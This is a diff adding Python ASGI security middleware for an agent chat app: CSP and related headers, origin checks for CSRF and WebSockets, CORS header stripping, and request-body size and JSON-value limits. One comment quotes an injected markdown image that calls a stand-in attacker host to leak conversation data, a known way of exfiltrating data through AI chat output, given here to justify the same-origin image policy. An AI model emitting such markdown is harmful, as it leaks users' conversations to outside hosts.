@@ -1,0 +1,239 @@
+"""Security headers and CSRF protection for this app.
+
+The Databricks Apps proxy handles login and TLS but does not add security
+headers or check where requests come from, so this ASGI middleware does both:
+
+- Adds a Content-Security-Policy (including ``frame-ancestors 'none'``) and
+  related headers to every HTTP response.
+- Rejects state-changing requests (POST, PUT, PATCH, DELETE) and WebSocket
+  connections whose ``Origin`` is not this app's URL (``DATABRICKS_APP_URL``)
+  or listed in ``ALLOWED_ORIGINS`` (comma-separated). A missing Origin is
+  allowed (non-browser clients); ``Origin: null`` is always rejected.
+- Removes ``Access-Control-*`` response headers unless the request's Origin is
+  allowed, so a proxied app (the chat UI) can't grant CORS access to other sites.
+
+``RequestValidationMiddleware`` rejects agent request bodies that are larger than
+``MAX_BODY_BYTES`` (413), are not a JSON object, hold more than ``MAX_JSON_VALUES``
+values, or are over the input limits (400).
+"""
+
+import json
+import logging
+import os
+import re
+
+from starlette.datastructures import MutableHeaders
+from starlette.responses import JSONResponse
+
+logger = logging.getLogger(__name__)
+
+CONTENT_SECURITY_POLICY = "; ".join(
+    [
+        "default-src 'self' https: wss:",
+        "script-src 'self' https:",
+        "style-src 'self' https: 'unsafe-inline'",
+        # The chat UI renders model markdown; keep images same-origin so injected
+        # ![](https://attacker/?d=...) can't leak conversation data.
+        "img-src 'self' data: blob:",
+        "font-src 'self' https: data:",
+        "object-src 'none'",
+        "base-uri 'self'",
+        "connect-src 'self' https: wss:",
+        "frame-ancestors 'none'",
+    ]
+)
+
+# FastAPI's Swagger UI pages start from an inline <script> that embeds the OpenAPI URL,
+# and ReDoc runs its search in a blob: worker; only these paths get either.
+DOCS_PATHS = {"/docs", "/docs/oauth2-redirect", "/redoc"}
+DOCS_CONTENT_SECURITY_POLICY = (
+    CONTENT_SECURITY_POLICY.replace(
+        "script-src 'self' https:", "script-src 'self' https: 'unsafe-inline'"
+    )
+    + "; worker-src 'self' blob:"
+)
+
+SECURITY_HEADERS = {
+    "Content-Security-Policy": CONTENT_SECURITY_POLICY,
+    "X-Frame-Options": "DENY",
+    "X-Content-Type-Options": "nosniff",
+    "Referrer-Policy": "strict-origin-when-cross-origin",
+    "Cross-Origin-Opener-Policy": "same-origin",
+}
+
+STATE_CHANGING_METHODS = {"POST", "PUT", "PATCH", "DELETE"}
+ORIGIN_FORMAT = re.compile(r"^https://[a-zA-Z0-9\-.]+(:[0-9]{1,5})?$")
+LOCALHOST_ORIGIN = re.compile(r"^http://(localhost|127\.0\.0\.1)(:[0-9]{1,5})?$")
+
+
+def _normalize(origin: str) -> str:
+    return origin.strip().lower().rstrip("/")
+
+
+def _allowed_origins() -> set[str]:
+    origins = [os.environ.get("DATABRICKS_APP_URL", "")]
+    origins += os.environ.get("ALLOWED_ORIGINS", "").split(",")
+    return {_normalize(origin) for origin in origins if origin.strip()}
+
+
+def is_origin_allowed(origin: str | None) -> bool:
+    if not origin:
+        return True
+    if origin == "null":
+        return False
+    if ORIGIN_FORMAT.match(origin) and _normalize(origin) in _allowed_origins():
+        return True
+    # Local development: the app isn't behind the Databricks Apps proxy.
+    return not os.environ.get("DATABRICKS_APP_URL") and bool(LOCALHOST_ORIGIN.match(origin))
+
+
+class SecurityMiddleware:
+    def __init__(self, app):
+        self.app = app
+
+    async def __call__(self, scope, receive, send):
+        if scope["type"] not in ("http", "websocket"):
+            return await self.app(scope, receive, send)
+
+        origin = next(
+            (value.decode("latin-1") for key, value in scope["headers"] if key == b"origin"),
+            None,
+        )
+        keep_cors_headers = bool(origin) and is_origin_allowed(origin)
+
+        async def send_with_headers(message):
+            if message["type"] == "http.response.start":
+                if not keep_cors_headers:
+                    message["headers"] = [
+                        (name, value)
+                        for name, value in message.get("headers", [])
+                        if not name.lower().startswith(b"access-control-")
+                    ]
+                headers = MutableHeaders(scope=message)
+                if scope["path"] in DOCS_PATHS:
+                    headers.setdefault("Content-Security-Policy", DOCS_CONTENT_SECURITY_POLICY)
+                for name, value in SECURITY_HEADERS.items():
+                    headers.setdefault(name, value)
+            await send(message)
+
+        is_websocket = scope["type"] == "websocket"
+        if is_websocket or scope["method"] in STATE_CHANGING_METHODS:
+            if not is_origin_allowed(origin):
+                logger.warning("Rejected cross-origin request to %r from %r", scope["path"], origin)
+                if is_websocket:
+                    await receive()
+                    await send({"type": "websocket.close", "code": 1008})
+                else:
+                    await send_with_headers(
+                        {
+                            "type": "http.response.start",
+                            "status": 403,
+                            "headers": [(b"content-type", b"text/plain")],
+                        }
+                    )
+                    await send({"type": "http.response.body", "body": b"Forbidden"})
+                return
+
+        if is_websocket:
+            return await self.app(scope, receive, send)
+
+        await self.app(scope, receive, send_with_headers)
+
+
+VALIDATED_PATHS = {"/invocations", "/responses"}
+# A request with base64 images can pass 20 MiB, and clients resend it on every later turn,
+# so a lower limit would refuse every later request in that thread.
+MAX_BODY_BYTES = 32 * 1024 * 1024
+# Request validation builds an error for every invalid element, which for a body of tiny
+# elements takes seconds and gigabytes, so values are counted before validation.
+# A text conversation that fills a 1-million-token context window has about 100,000 values.
+MAX_JSON_VALUES = 300_000
+
+
+def _count_json_values(data, limit: int) -> int:
+    """Count the values in parsed JSON, stopping once the count passes ``limit``."""
+    count, stack = 0, [data]
+    while stack and count <= limit:
+        value = stack.pop()
+        count += 1
+        if isinstance(value, dict):
+            stack.extend(value.values())
+        elif isinstance(value, list):
+            stack.extend(value)
+    return count
+
+
+class RequestValidationMiddleware:
+    """Return 400 for POST /invocations and /responses bodies that ``validate`` rejects.
+
+    AgentServer turns any exception raised in an invoke or stream handler into a 500 or
+    an SSE error event, so client errors have to be caught before the request reaches it.
+    Bodies over ``MAX_BODY_BYTES`` get a 413 before they are fully read, and bodies that
+    aren't a JSON object (including JSON nested too deeply to parse) or hold more than
+    ``MAX_JSON_VALUES`` values get a 400.
+    ``validate`` receives the parsed JSON body and raises ``ValueError`` to reject it.
+    """
+
+    def __init__(self, app, validate):
+        self.app = app
+        self.validate = validate
+
+    async def __call__(self, scope, receive, send):
+        if (
+            scope["type"] != "http"
+            or scope["method"] != "POST"
+            or scope["path"] not in VALIDATED_PATHS
+        ):
+            return await self.app(scope, receive, send)
+
+        too_large = JSONResponse(
+            {"detail": f"Request body too large (limit {MAX_BODY_BYTES} bytes)."}, status_code=413
+        )
+        content_length = dict(scope["headers"]).get(b"content-length", b"")
+        if content_length.isdigit() and int(content_length) > MAX_BODY_BYTES:
+            return await too_large(scope, receive, send)
+
+        chunks = []
+        size = 0
+        while True:
+            message = await receive()
+            if message["type"] != "http.request":
+                return
+            chunk = message.get("body", b"")
+            size += len(chunk)
+            if size > MAX_BODY_BYTES:
+                return await too_large(scope, receive, send)
+            chunks.append(chunk)
+            if not message.get("more_body", False):
+                break
+        body = b"".join(chunks)
+
+        try:
+            data = json.loads(body)
+        except (ValueError, RecursionError):
+            data = None
+        if not isinstance(data, dict):
+            response = JSONResponse({"detail": "Request body must be a JSON object."}, status_code=400)
+            return await response(scope, receive, send)
+        if _count_json_values(data, MAX_JSON_VALUES) > MAX_JSON_VALUES:
+            response = JSONResponse(
+                {"detail": f"Request body has too many JSON values (limit {MAX_JSON_VALUES})."},
+                status_code=400,
+            )
+            return await response(scope, receive, send)
+        try:
+            self.validate(data)
+        except (ValueError, RecursionError) as e:
+            response = JSONResponse({"detail": str(e)}, status_code=400)
+            return await response(scope, receive, send)
+
+        body_sent = False
+
+        async def replay_body():
+            nonlocal body_sent
+            if body_sent:
+                return await receive()
+            body_sent = True
+            return {"type": "http.request", "body": body, "more_body": False}
+
+        await self.app(scope, replay_body, send)
